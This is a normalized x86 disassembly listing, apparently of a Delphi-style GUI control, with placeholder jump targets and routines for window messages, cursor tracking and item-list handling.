mov edx [ ebp - 0x4 ]
mov eax esi
call sub_476d8c
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_418900
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_476cc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_476bdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_47661c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_47661c
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_47661c
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_47661c
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_4769d0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4769d0
pop edx
call sub_4763ec
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_476c6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_416b70
mov eax [ ebp - 0x8 ]
push eax
push sub_476cc4
mov eax [ ebp - 0x8 ]
push eax
push sub_476d8c
push ebp
call sub_476bdc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_476cc4
push ebp
mov ebp esp
add esp 0xfffffed8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448788
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x1
xor edx edx
push ebp
push sub_476d7d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_476654
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_418b0c
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_476ae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476d84
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
cmp [ ebp - 0xd ] 0x0
je r-xdata
inc edi
retn
mov eax [ ebp - 0x4 ]
call sub_476b34
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4766e8
mov ebx eax
lea ecx [ ebp - 0x125 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_476414
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
mov si 0xffac
call sub_4038bc
dec edi
jne r-xdata
sub_476d8c
push ebx
push esi
push edi
add esp 0xfffffee4
mov esi edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_4769b4
mov ebx eax
test ebx ebx
je r-xdata
mov edx esp
mov ecx 0x4
mov eax esi
call sub_418b44
mov eax edi
call sub_4769b4
mov ebx eax
test ebx ebx
je r-xdata
inc [ esp ]
mov eax ebx
call sub_475bac
mov ebx eax
test ebx ebx
jne r-xdata
add esp 0x11c
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esi
mov eax ebx
call sub_476504
mov eax ebx
call sub_475bac
mov ebx eax
test ebx ebx
jne r-xdata
sub_476dfc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi edx
mov ebx eax
mov eax edi
call sub_4188e0
push edx
push eax
mov eax edi
call sub_418914
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esp
mov ecx 0x4
mov eax edi
call sub_418b0c
xor esi esi
mov eax ebx
call sub_4769b4
mov ebx eax
jmp r-xdata
jmp r-xdata
cmp esi [ esp ]
jge r-xdata
test ebx ebx
jne r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax edi
call sub_418b0c
mov dl [ esp + 0x4 ]
mov eax ebx
call sub_475978
inc esi
mov eax ebx
call sub_475d18
mov ebx eax
sub_476e78
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_47661c
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax esi
call sub_418b44
mov eax ebx
call sub_4769b4
mov ebx eax
test ebx ebx
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_475970
mov [ esp + 0x4 ] al
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax esi
call sub_418b44
mov eax ebx
call sub_475d18
mov ebx eax
test ebx ebx
jne r-xdata
sub_476edc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444294
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x79
mov eax ebx
call sub_441520
mov edx 0x61
mov eax ebx
call sub_441544
mov dl 0x1
mov eax ebx
call sub_4486b8
xor edx edx
mov eax ebx
call sub_441f28
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov esi eax
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx ebx
call sub_440940
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x209 ] 0x1
mov [ ebx + 0x258 ] 0x1
mov [ ebx + 0x25a ] 0x1
mov [ ebx + 0x259 ] 0x1
mov [ ebx + 0x22c ] 0x1
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ebf4
mov [ ebx + 0x21c ] eax
mov [ ebx + 0x24c ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x278 ] eax
mov [ ebx + 0x274 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x275 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437368
mov esi eax
mov [ ebx + 0x330 ] esi
mov eax esi
xor edx edx
call sub_4374f0
mov eax [ ebx + 0x330 ]
xor edx edx
call sub_437500
push ebx
push sub_477a98
mov eax [ ebx + 0x330 ]
call sub_437510
mov [ ebx + 0x290 ] 0x1
mov [ ebx + 0x268 ] 0x1
push ebx
push sub_47765c
call sub_41f228
mov [ ebx + 0x228 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x230 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_478b28
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x264 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_478b28
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_477091
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x26c ]
call sub_4036c0
xor eax eax
mov [ esi + 0x26c ] eax
mov eax [ esi + 0x27c ]
call sub_4036c0
mov eax [ esi + 0x278 ]
call sub_4036c0
mov eax [ esi + 0x330 ]
call sub_4036c0
mov eax [ esi + 0x250 ]
call sub_4036c0
mov eax [ esi + 0x21c ]
call sub_4036c0
mov eax [ esi + 0x23c ]
call sub_4036c0
mov eax [ esi + 0x228 ]
call sub_41f2c0
mov eax [ esi + 0x230 ]
call sub_4036c0
mov eax [ esi + 0x264 ]
call sub_4036c0
mov eax [ esi + 0x20c ]
call sub_4036c0
xor eax eax
mov [ esi + 0x20c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_477144
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x2
call sub_473ae8
mov edx esi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44530c
mov eax ebx
call sub_4423c0
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ esi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x259 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x209 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x25a ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x258 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x22c ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x5d ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebx + 0x268 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x208 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x22d ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x247 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x209 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_477266
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
mov eax [ ebp - 0x4 ]
call sub_44550c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_421054
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
pop edx
call sub_42966c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
pop edx
call sub_429684
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476ae8
xor edx edx
push ebp
push sub_47740c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476cc4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476dfc
mov eax [ ebp - 0x4 ]
add eax 0x23c
call sub_40dabc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x254 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_4769d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_477a70
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x254 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x234 ]
test ebx ebx
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4779c0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_4769d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_477b08
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x260 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x27c
call sub_40dabc
mov eax [ ebp - 0x4 ]
call sub_4797ec
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4793b4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_477b08
jmp r-xdata
inc ebx
xor esi esi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x234 ]
call sub_44ef40
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_478b00
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x248 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx esi
call sub_4161a0
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_4769d0
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_416044
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_44ef40
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_478b00
sub_477498
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4779e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24c ] eax
mov eax [ ebp - 0x4 ]
call sub_4458bc
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_47661c
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476d8c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476e78
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_418900
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x254 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x248 ] edx
mov eax [ ebp - 0x4 ]
call sub_477a40
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476ae8
xor eax eax
push ebp
push sub_477636
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax ebx
call sub_475dc0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov eax [ ebp - 0x4 ]
call sub_477ac0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x8 ] 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476654
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476b34
retn
mov eax ebx
call sub_475dc0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x248 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x27c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx [ eax ]
call [ edx + 0x8 ]
jmp r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_4161a0
call sub_475dc0
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_416044
inc esi
dec ebx
jne r-xdata
sub_47765c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403ba0#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x105
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44740c
test al al
je r-xdata
sub eax 0x100
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x224 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44733c
test al al
je r-xdata
dec eax
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4474d4
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
sub_47775c
push ebx
mov ebx eax
mov eax ebx
call sub_447a04
mov eax [ ebx + 0x70 ]
call sub_421054
push eax
mov eax ebx
call sub_448484
pop edx
call sub_42966c
pop ebx
retn
sub_47779c
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax ebx
call sub_448484
pop edx
call sub_429684
pop ebx
retn
sub_4777c4
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
call sub_447b68
test [ esi + 0x1c ] 0x1
jne r-xdata
pop edi
pop esi
retn
mov [ edi ] 0x15
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4777f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax sub_475210
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ esi + 0x26c ]
call sub_476ed4
mov eax [ esi + 0x26c ]
call sub_4769b4
mov edi eax
test edi edi
je r-xdata
mov [ ebp - 0x14 ] 0xffff0000
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax esi
call sub_448484
lea edx [ ebp - 0x14 ]
xor ecx ecx
call sub_429650
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax edi
call sub_475ad0
test al al
je r-xdata
mov eax edi
call sub_475bac
mov edi eax
test edi edi
jne r-xdata
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_476290
sub_4778a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x5d ]
je r-xdata
mov edx ebx
mov eax esi
call sub_44116c
pop esi
pop ebx
retn
test bl bl
sete cl
mov edx 0x10
mov eax esi
call sub_473c40
sub_4778d0
push ebx
add esp 0xfffffff0
mov ebx eax
mov [ esp ] edx
mov [ esp + 0x4 ] ecx
mov eax ebx
call sub_448484
mov edx esp
call sub_429620
test eax eax
je r-xdata
xor eax eax
mov edx [ esp + 0xc ]
mov eax [ ebx + 0x26c ]
call sub_476ab8
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_477908
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov ebx eax
mov si [ r-xdata ]
mov [ esp ] edx
mov [ esp + 0x4 ] edi
mov eax ebx
call sub_448484
mov edx esp
call sub_429620
mov ebx [ esp + 0x8 ]
test bh 0x1
je r-xdata
test bh 0x2
je r-xdata
or si 0x1
test bl 0x1
je r-xdata
or si 0x2
mov eax ebx
and eax 0x46
cmp eax 0x46
jne r-xdata
or si 0x4
test eax eax
je r-xdata
or si 0x8
jmp r-xdata
test bl 0x2
je r-xdata
or si 0x8
test bl 0x10
je r-xdata
test bl 0x4
je r-xdata
or si 0x20
test bl 0x8
je r-xdata
or si 0x10
test bl 0x40
je r-xdata
or si 0x80
test bl 0x20
je r-xdata
or si 0x40
or si 0x200
test bh 0x8
je r-xdata
or si 0x100
test bh 0x4
je r-xdata
or si 0x400
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
or si 0x800
sub_4779c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4779e4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_448484
mov edx esi
call sub_4294c8
sub_4779f8
push ebx
mov eax [ eax + 0x26c ]
call sub_4769b4
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_475958
mov eax ebx
call sub_475bac
mov ebx eax
test ebx ebx
jne r-xdata
sub_477a40
push ebx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_448484
call sub_429548
mov edx eax
mov eax [ ebx + 0x26c ]
call sub_476ab8
pop ebx
retn
sub_477a70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_448484
mov edx [ esi + 0x10 ]
call sub_4295d0
sub_477ac0
push ebx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
xor eax eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_448484
call sub_429570
mov edx eax
mov eax [ ebx + 0x26c ]
call sub_476ab8
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov eax [ ebx + 0x240 ]
jmp r-xdata
pop ebx
retn
sub_477b08
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax ebx
call sub_448484
xor edx edx
call sub_4295b8
pop ebx
retn
mov eax edx
mov dl 0x1
call sub_4759ac
pop ebx
retn
sub_477b2c
push ebx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
xor eax eax
mov eax ebx
call sub_448484
call sub_429580
mov edx eax
mov eax [ ebx + 0x26c ]
call sub_476ab8
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x238 ]
pop ebx
retn
sub_477b64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_448484
xor edx edx
call sub_4295c4
mov dl 0x1
mov eax esi
call sub_475a88
jmp r-xdata
sub_477b98
push esi
xor ecx ecx
mov esi [ eax + 0x26c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
test [ edx + 0x8 ] 0x4
je r-xdata
mov edx [ edx + 0x4 ]
mov eax esi
call sub_476ab8
mov ecx eax
mov ecx [ edx + 0x24 ]
jmp r-xdata
sub_477bc0
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4785e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
cmp edx 0xfffffe6b
jg r-xdata
cmp edx 0xfffffe6f
jg r-xdata
je r-xdata
sub edx 0xfffffff4
je r-xdata
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x245 ] 0x0
jne r-xdata
cmp edx 0xfffffe66
jg r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20c ]
test edx edx
je r-xdata
sub edx 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_4038bc
test al al
jne r-xdata
sub edx 0xfffffe6c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4785ef
lea eax [ ebp - 0x90 ]
call sub_40442c
retn
mov edx [ ebp - 0x8 ]
mov ebx eax
lea edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edi eax
cmp [ ebx + 0xc ] 0x2
jne r-xdata
sub edx 0xfffffe67
je r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx eax
mov eax edx
call sub_422134
xor edx edx
push ebp
push sub_4781d6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
test [ ebx + 0xe ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ebx eax
lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edi eax
test edi edi
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0xc ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4038bc
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edi eax
test edi edi
je r-xdata
sub edx 0x2
je r-xdata
mov edx [ ebp - 0x8 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4424ec
test al al
jne r-xdata
sub edx 0xfffffe3d
je r-xdata
lea eax [ ebp - 0x4e ]
xor ecx ecx
mov edx 0x28
call sub_402fc4
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x4a ] eax
lea edx [ ebp - 0x4e ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edi eax
test edi edi
jne r-xdata
lea edx [ ebp - 0x26 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_4074a8
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push 0xbc7b
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call PostMessageA
lea ecx [ ebp - 0x98 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4418a8
lea eax [ ebp - 0x98 ]
call sub_4074a8
mov [ ebp - 0x16 ] eax
movsx ecx [ ebp - 0x14 ]
movsx edx [ ebp - 0x16 ]
mov eax [ ebp - 0x4 ]
call sub_4778d0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x240 ] eax
lea eax [ ebp - 0x10 ]
call sub_4074a8
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
mov ecx eax
mov edx 0x7b
mov eax [ ebp - 0x4 ]
call sub_442f30
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
jmp r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
mov edx [ ebp - 0x8 ]
mov ebx eax
lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edi eax
test edi edi
je r-xdata
dec edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
